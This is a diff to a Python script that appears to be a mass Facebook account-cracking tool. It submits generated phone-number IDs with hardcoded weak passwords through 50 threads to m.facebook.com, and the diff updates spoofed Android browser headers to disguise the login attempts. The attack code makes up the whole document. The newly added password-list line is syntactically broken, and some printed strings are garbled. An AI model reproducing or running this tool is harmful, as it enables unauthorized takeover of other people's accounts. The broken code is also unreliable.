@@ -51,7 +51,7 @@ today = date.today()
 
 logo =("""\033[1;32m 
  \033[1;32m  █░█ █▀▀ █▄░█ █▀█ █▀▄▀█
-\033[1;37m   ▀▄▀ ██▄ █░▀█ █▄█ █░▀░█     \033[1;32m X pro v:0.1           
+\033[1;37m   ▀▄▀ ██▄ █░▀█ █▄█ █░▀░█     \033[1;32m X pro \033[1;37m v:0.1           
 \033[1;32m 
 \033[1;32m 
 \033[1;32m----------------------------------------""")
@@ -131,11 +131,11 @@ def uf():
     with ThreadPool(max_workers=50) as morshed:
         clear()
         tl = str(len(user))
-        print(f' \033[1;91m[\033[1;92mâœ”ï¸Ž\033[1;91m]\033[1;92m YOUR TOTAL IDS: {xr}'+tl)
-        print(' \033[1;91m[\033[1;92mâœ”ï¸Ž\033[1;91m]\033[1;92m COUNTRY CODE : \033[1;32m'+code)
+        print(f' \033[1;91m[\033[1;92m\033[1;91m]\033[1;92m YOUR TOTAL IDS: {xr}'+tl)
+        print(' \033[1;91m[\033[1;92m\033[1;91m]\033[1;92m COUNTRY CODE : \033[1;32m'+code)
         print("\033[1;32m----------------------------------------")
         for love in user:
-            pwx = [love[1:]]
+            pwx = [love[1:]'FREE FIRE','112255','112244','09876543','258025','00009999','123412','alamin','nazmul']
             uid = code+love
             morshed.submit(rcrack,uid,pwx,tl)
 def rcrack(uid,pwx,tl):
@@ -163,12 +163,17 @@ def rcrack(uid,pwx,tl):
             header_freefb = {"authority": 'm.facebook.com',
             "method": 'GET',
             "scheme": 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'dpr': '1.712499976158142',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.58"',
             'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"Infinix X688B"',
             'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
